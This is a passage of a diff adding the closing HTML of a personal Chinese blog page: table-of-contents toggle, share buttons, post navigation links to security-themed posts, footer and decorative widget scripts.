class="toc-text">⑤直接上vulnhub进行验证</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+
+<script src="//cdn.bootcdn.net/ajax/libs/require.js/2.3.6/require.js"></script>
+
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2022/01/17/Java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/" title="上一篇: Java网络编程">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含利用思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/18/ICMP%E9%9A%A7%E9%81%93%E6%A8%A1%E5%BC%8F%E4%BD%BF%E7%94%A8/">ICMP隧道模式使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/17/Java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/">Java网络编程</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/17/vulnhub%E9%9D%B6%E6%9C%BAOs-hackNos-1/">ICMP隧道模式使用</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2022 mrfan6
+            </div>
+            <div class="footer-right">
+                <a href="#" target="_blank">mrfan6</a>
+            </div>
+        </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="//cdn.bootcdn.net/ajax/libs/require.js/2.3.6/require.js"></script>
+
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+<!--动态线条背景-->
+<script type="text/javascript"
+color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
